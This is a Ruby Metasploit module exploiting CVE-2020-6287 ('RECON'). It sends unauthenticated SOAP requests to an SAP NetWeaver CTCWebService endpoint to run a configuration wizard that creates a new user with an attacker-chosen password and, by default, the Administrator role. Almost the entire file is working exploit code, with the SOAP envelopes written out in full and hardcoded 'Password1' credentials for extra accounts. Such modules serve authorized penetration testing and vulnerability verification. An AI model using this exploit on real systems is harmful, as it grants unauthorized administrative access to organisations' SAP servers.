##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'SAP Unauthenticated WebService User Creation',
        'Description' => %q{
          This module leverages an unauthenticated web service to submit a job which will create a user with a specified
          role. The job involves running a wizard. After the necessary action is taken, the job is canceled to avoid
          unnecessary system changes.
        },
        'Author' => [
          'Pablo Artuso', # The Onapsis Security Researcher who originally found the vulnerability
          'Dmitry Chastuhin', # Author of one of the early PoCs utilizing CTCWebService
          'Spencer McIntyre' # This Metasploit module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          [ 'CVE', '2020-6287' ],
          [ 'URL', 'https://github.com/chipik/SAP_RECON' ],
          [ 'URL', 'https://www.onapsis.com/recon-sap-cyber-security-vulnerability' ],
          [ 'URL', 'https://us-cert.cisa.gov/ncas/alerts/aa20-195a' ]
        ],
        'Notes' => {
          'AKA' => [ 'RECON' ]
        },
        'DisclosureDate' => '2020-07-14'
      )
    )

    register_options(
      [
        Opt::RPORT(50000),
        OptString.new('USERNAME', [ true, 'The username to create' ]),
        OptString.new('PASSWORD', [ true, 'The password for the new user' ]),
        OptString.new('ROLE', [ true, 'The role to assign the new user', 'Administrator' ]),
        OptString.new('TARGETURI', [ true, 'Path to ConfigServlet', '/CTCWebService/CTCWebServiceBean' ])
      ]
    )
  end

  def run
    job = nil
    print_status('Starting the PCK Upgrade job...')
    job = invoke_pckupgrade
    print_good("Job running with session id: #{job.session_id}")

    report_vuln(
      host: rhost,
      port: rport,
      name: name,
      sname: ssl ? 'https' : 'http',
      proto: 'tcp',
      refs: references,
      info: "Module #{fullname} successfully submitted a job via the CTCWebService"
    )

    loop do
      # it's a slow process, wait between status checks
      sleep 2

      next unless job.has_events_available?

      event = job.get_event

      unless (action_id = event.xpath('//ctc:StartAction/ctc:Action/ctc:ActionId/text()')).blank?
        if action_id.to_s == 'genErrorNotification'
          report_error_details(job)
          fail_with(Failure::Unknown, 'General error')
        end
      end

      unless (description = event.xpath('//ctc:StartAction/ctc:Action/ctc:Description/text()')).blank?
        vprint_status("Received event description: #{description}")
      end

      unless (description = event.xpath('//ctc:FinishAction/ctc:Action/ctc:Description/text()')).blank?
        break if description.to_s =~ /Assign Role SAP_XI_PCK_CONFIG to PCKUser/i
      end
    end
  ensure
    unless job.nil?
      print_status('Canceling the PCK Upgrade job...')
      job.cancel_execution
    end
  end

  def report_error_details(job)
    print_error('Received a general error notification')
    error_event = job.get_event

    print_error('Error details:')
    error_event.xpath('//ctc:Notification/ctcNote:Messages/ctcNote:Message').each do |message|
      print_error("  #{message.text}")
    end
  end

  def send_request_soap(envelope)
    res = send_request_cgi(
      {
        'uri' => normalize_uri(target_uri.path),
        'method' => 'POST',
        'ctype' => 'text/xml;charset=UTF-8',
        'data' => envelope
      }
    )

    return nil unless res&.code == 200
    return nil unless res.headers['Content-Type'].strip.start_with?('text/xml')

    res
  end

  def invoke_pckupgrade
    message = { name: 'Netweaver.PI_PCK.PCK' }
    message[:data] = Nokogiri::XML(<<-ENVELOPE, nil, nil, Nokogiri::XML::ParseOptions::NOBLANKS).root.to_xml(indent: 0, save_with: 0)
      <PCK>
        <Usermanagement>
          <SAP_XI_PCK_CONFIG>
            <roleName>#{datastore['ROLE'].encode(xml: :text)}</roleName>
          </SAP_XI_PCK_CONFIG>
          <SAP_XI_PCK_COMMUNICATION>
            <roleName>Administrator</roleName>
          </SAP_XI_PCK_COMMUNICATION>
          <SAP_XI_PCK_MONITOR>
            <roleName>Administrator</roleName>
          </SAP_XI_PCK_MONITOR>
          <SAP_XI_PCK_ADMIN>
            <roleName>Administrator</roleName>
          </SAP_XI_PCK_ADMIN>
          <PCKUser>
            <userName>#{datastore['USERNAME'].encode(xml: :text)}</userName>
            <password secure="true">#{datastore['PASSWORD'].encode(xml: :text)}</password>
          </PCKUser>
          <PCKReceiver>
            <userName>pckreceiver2</userName>
            <password secure="true">Password1</password>
          </PCKReceiver>
          <PCKMonitor>
            <userName>pckmonitor2</userName>
            <password secure="true">Password1</password>
          </PCKMonitor>
          <PCKAdmin>
            <userName>pckadmin2</userName>
            <password secure="true">Password1</password>
          </PCKAdmin>
        </Usermanagement>
      </PCK>
    ENVELOPE

    envelope = Nokogiri::XML(<<-ENVELOPE, nil, nil, Nokogiri::XML::ParseOptions::NOBLANKS).root.to_xml(indent: 0, save_with: 0)
      <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:CTCWebServiceSi">
        <soapenv:Header/>
        <soapenv:Body>
          <urn:execute>
              <identifier>
                <component>sap.com/tc~lm~config~content</component>
                <path>content/Netweaver/PI_PCK/PCK/PCKProcess.cproc</path>
             </identifier>
             <contextMessages>
                <baData>#{Rex::Text.encode_base64(message[:data])}</baData>
                <name>#{message[:name]}</name>
             </contextMessages>
          </urn:execute>
         </soapenv:Body>
      </soapenv:Envelope>
    ENVELOPE

    res = send_request_soap(envelope)
    fail_with(Failure::UnexpectedReply, 'Failed to start the PCK Upgrade process') unless res&.code == 200

    session_id = res.get_xml_document.xpath('//return/text()').to_s
    WebServiceJob.new(self, session_id)
  end
end

class WebServiceJob
  def initialize(mod, session_id)
    @mod = mod
    @session_id = session_id
  end

  def cancel_execution
    envelope = Nokogiri::XML(<<-ENVELOPE, nil, nil, Nokogiri::XML::ParseOptions::NOBLANKS).root.to_xml(indent: 0, save_with: 0)
      <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:CTCWebServiceSi">
         <soapenv:Header/>
         <soapenv:Body>
            <urn:cancelExecution>
               <sessionId>#{@session_id.encode(xml: :text)}</sessionId>
            </urn:cancelExecution>
         </soapenv:Body>
      </soapenv:Envelope>
    ENVELOPE
    res = send_request_soap(envelope)
    fail_with(Failure::UnexpectedReply, 'Failed to cancel execution') if res.nil?

    res.get_xml_document.xpath('//return/text()').to_s != 'false'
  end

  def get_event # rubocop:disable Naming/AccessorMethodName
    envelope = Nokogiri::XML(<<-ENVELOPE, nil, nil, Nokogiri::XML::ParseOptions::NOBLANKS).root.to_xml(indent: 0, save_with: 0)
      <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:CTCWebServiceSi">
         <soapenv:Header/>
         <soapenv:Body>
            <urn:getNextEvent>
               <sessionId>#{@session_id.encode(xml: :text)}</sessionId>
            </urn:getNextEvent>
         </soapenv:Body>
      </soapenv:Envelope>
    ENVELOPE
    res = send_request_soap(envelope)
    fail_with(Failure::UnexpectedReply, 'Failed to retrieve the event information') if res.nil?

    Nokogiri::XML(Rex::Text.decode_base64(res.get_xml_document.xpath('//return/text()')))
  end

  def has_events_available? # rubocop:disable Naming/PredicateName
    envelope = Nokogiri::XML(<<-ENVELOPE, nil, nil, Nokogiri::XML::ParseOptions::NOBLANKS).root.to_xml(indent: 0, save_with: 0)
      <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:CTCWebServiceSi">
         <soapenv:Header/>
         <soapenv:Body>
            <urn:eventsAvailable>
               <sessionId>#{@session_id.encode(xml: :text)}</sessionId>
            </urn:eventsAvailable>
         </soapenv:Body>
      </soapenv:Envelope>
    ENVELOPE
    res = send_request_soap(envelope)
    fail_with(Failure::UnexpectedReply, 'Failed to check if events are available') if res.nil?

    res.get_xml_document.xpath('//return/text()').to_s != 'false'
  end

  attr_reader :session_id

  private

  def send_request_soap(*args, **kwargs)
    @mod.send_request_soap(*args, **kwargs)
  end
end
